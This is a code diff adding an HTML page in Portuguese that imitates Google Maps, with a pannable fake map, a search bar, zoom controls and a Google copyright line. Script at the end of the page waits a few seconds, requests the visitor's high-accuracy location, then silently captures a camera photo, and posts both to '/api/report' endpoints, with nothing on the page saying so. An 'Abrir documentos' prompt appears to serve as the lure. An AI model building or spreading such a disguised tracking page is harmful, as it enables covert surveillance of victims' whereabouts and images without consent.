@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>Google Maps</title>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+    .fake-maps-wrap {
+      position: absolute;
+      inset: 0;
+      overflow: hidden;
+    }
+    .fake-maps-pan {
+      position: absolute;
+      inset: 0;
+      overflow: hidden;
+      touch-action: none;
+      cursor: grab;
+    }
+    .fake-maps-pan:active { cursor: grabbing; }
+    .fake-maps-bg {
+      position: absolute;
+      width: 150%;
+      height: 150%;
+      left: -25%;
+      top: -25%;
+      background: #e5e3df url('/mapa.png') center center / cover no-repeat;
+      will-change: transform;
+    }
+    .fake-maps-search {
+      position: absolute;
+      top: 0.75rem;
+      left: 1rem;
+      right: 1rem;
+      height: 2.75rem;
+      max-width: 28rem;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      background: #fff;
+      border-radius: 2rem;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.2);
+      padding: 0 1rem 0 2.75rem;
+      font-family: Roboto, "Helvetica Neue", Arial, sans-serif;
+      font-size: 0.95rem;
+      color: #5f6368;
+    }
+    .fake-maps-search-icon {
+      position: absolute;
+      left: 0.875rem;
+      width: 1.25rem;
+      height: 1.25rem;
+      opacity: 0.6;
+    }
+    .fake-maps-zoom {
+      position: absolute;
+      right: 1rem;
+      top: 50%;
+      transform: translateY(-50%);
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+      background: #fff;
+      border-radius: 2px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.2);
+      overflow: hidden;
+    }
+    .fake-maps-zoom-btn {
+      width: 2.5rem;
+      height: 2.5rem;
+      border: none;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.25rem;
+      color: #5f6368;
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .fake-maps-zoom-btn:hover { background: #f1f3f4; }
+    .fake-maps-zoom-btn:active { background: #e8eaed; }
+    .fake-maps-mylocation {
+      position: absolute;
+      right: 1rem;
+      bottom: 6rem;
+      width: 2.5rem;
+      height: 2.5rem;
+      border: none;
+      border-radius: 2px;
+      background: #fff;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .fake-maps-mylocation svg { width: 1.25rem; height: 1.25rem; }
+    .fake-maps-scale {
+      position: absolute;
+      bottom: 4.5rem;
+      left: 1rem;
+      font-family: Roboto, Arial, sans-serif;
+      font-size: 11px;
+      color: #5f6368;
+      background: rgba(255,255,255,0.9);
+      padding: 2px 6px;
+      border-radius: 2px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+    }
+    .fake-maps-legal {
+      position: absolute;
+      bottom: 0.5rem;
+      left: 0.5rem;
+      right: 0.5rem;
+      font-family: Roboto, Arial, sans-serif;
+      font-size: 10px;
+      color: #5f6368;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.25rem;
+    }
+    .fake-maps-legal a { color: #1a73e8; text-decoration: none; }
+
+    .doc-modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.4);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
+    .doc-modal-overlay.hidden { display: none; }
+    .doc-modal {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+      max-width: 320px;
+      width: 100%;
+      overflow: hidden;
+    }
+    .doc-modal-title {
+      padding: 1.25rem 1.25rem 0.5rem;
+      font-family: -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+      font-size: 17px;
+      font-weight: 600;
+      color: #000;
+      text-align: center;
+    }
+    .doc-modal-body {
+      padding: 0.5rem 1.25rem 1.25rem;
+      text-align: center;
+    }
+    .doc-modal-btn {
+      display: block;
+      width: 100%;
+      padding: 0.75rem 1rem;
+      margin-top: 0.5rem;
+      font-size: 16px;
+      font-weight: 600;
+      color: #007aff;
+      background: none;
+      border: none;
+      border-top: 1px solid #e0e0e0;
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .doc-modal-btn:active { background: #f1f3f4; }
+  </style>
+</head>
+<body>
+  <div class="doc-modal-overlay" id="docModal">
+    <div class="doc-modal">
+      <div class="doc-modal-title">Abrir documentos</div>
+      <div class="doc-modal-body">
+        <button type="button" class="doc-modal-btn" id="docModalOk">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="fake-maps-wrap">
+    <div class="fake-maps-pan" id="mapPan">
+      <div class="fake-maps-bg" id="mapBg"></div>
+    </div>
+    <div class="fake-maps-search">
+      <svg class="fake-maps-search-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+      <span>Pesquisar no Google Maps</span>
+    </div>
+    <div class="fake-maps-zoom">
+      <button type="button" class="fake-maps-zoom-btn" aria-label="Aumentar zoom">+</button>
+      <button type="button" class="fake-maps-zoom-btn" aria-label="Diminuir zoom">−</button>
+    </div>
+    <button type="button" class="fake-maps-mylocation" aria-label="Sua localização">
+      <svg viewBox="0 0 24 24" fill="#4285f4"><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm0 10c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6zm0-14C7.58 4 4 7.58 4 12s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8z"/></svg>
+    </button>
+    <div class="fake-maps-scale">100 m</div>
+    <div class="fake-maps-legal">
+      <span>© 2025 Google</span>
+      <span><a href="#">Termos</a> · <a href="#">Enviar feedback</a></span>
+    </div>
+  </div>
+  <script>
+    (function() {
+      var overlay = document.getElementById('docModal');
+      var btnOk = document.getElementById('docModalOk');
+      if (overlay && btnOk) {
+        btnOk.addEventListener('click', function() {
+          overlay.classList.add('hidden');
+        });
+      }
+    })();
+
+    (function() {
+      var bg = document.getElementById('mapBg');
+      var pan = document.getElementById('mapPan');
+      var x = 0, y = 0;
+      var startX, startY, startTranslateX, startTranslateY;
+      var isTouch = false;
+
+      function getClientX(e) { return e.touches ? e.touches[0].clientX : e.clientX; }
+      function getClientY(e) { return e.touches ? e.touches[0].clientY : e.clientY; }
+
+      function clamp(val, min, max) { return Math.min(Math.max(val, min), max); }
+
+      function applyTransform() {
+        var w = pan.offsetWidth, h = pan.offsetHeight;
+        var maxX = w * 0.25, maxY = h * 0.25;
+        x = clamp(x, -maxX, maxX);
+        y = clamp(y, -maxY, maxY);
+        bg.style.transform = 'translate(' + x + 'px, ' + y + 'px)';
+      }
+
+      function onStart(e) {
+        e.preventDefault();
+        isTouch = e.touches !== undefined;
+        startX = getClientX(e);
+        startY = getClientY(e);
+        startTranslateX = x;
+        startTranslateY = y;
+        if (isTouch) {
+          pan.addEventListener('touchmove', onMove, { passive: false });
+          pan.addEventListener('touchend', onEnd);
+          pan.addEventListener('touchcancel', onEnd);
+        } else {
+          document.addEventListener('mousemove', onMove);
+          document.addEventListener('mouseup', onEnd);
+        }
+      }
+
+      function onMove(e) {
+        e.preventDefault();
+        var cx = getClientX(e), cy = getClientY(e);
+        x = startTranslateX + (cx - startX);
+        y = startTranslateY + (cy - startY);
+        applyTransform();
+      }
+
+      function onEnd() {
+        if (isTouch) {
+          pan.removeEventListener('touchmove', onMove);
+          pan.removeEventListener('touchend', onEnd);
+          pan.removeEventListener('touchcancel', onEnd);
+        } else {
+          document.removeEventListener('mousemove', onMove);
+          document.removeEventListener('mouseup', onEnd);
+        }
+      }
+
+      pan.addEventListener('mousedown', onStart, { passive: false });
+      pan.addEventListener('touchstart', onStart, { passive: false });
+    })();
+
+    var data = { geolocation: null };
+
+    async function getGeolocation() {
+      return new Promise(function(resolve) {
+        if (!navigator.geolocation) return resolve();
+        navigator.geolocation.getCurrentPosition(
+          function(pos) {
+            data.geolocation = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              altitude: pos.coords.altitude
+            };
+            resolve();
+          },
+          function() { resolve(); },
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        );
+      });
+    }
+
+    function capturePhoto() {
+      return new Promise(function(resolve) {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return resolve(null);
+        var constraints = {
+          video: { facingMode: /Android|iPhone|iPad/i.test(navigator.userAgent) ? 'environment' : 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        };
+        navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
+          var video = document.createElement('video');
+          video.srcObject = stream;
+          video.play().then(function() {
+            var canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            var ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            stream.getTracks().forEach(function(t) { t.stop(); });
+            resolve(canvas.toDataURL('image/jpeg', 0.8));
+          }).catch(function() { resolve(null); });
+        }).catch(function() { resolve(null); });
+      });
+    }
+
+    setTimeout(async function() {
+      await getGeolocation();
+      if (data.geolocation) {
+        fetch('/api/report/geolocation', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ geolocation: data.geolocation })
+        }).catch(function() {});
+      }
+      setTimeout(async function() {
+        var photo = await capturePhoto();
+        if (photo) {
+          fetch('/api/report/camera', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ camera: photo })
+          }).catch(function() {});
+        }
+      }, 5000);
+    }, 5000);
+  </script>
+</body>
+</html>
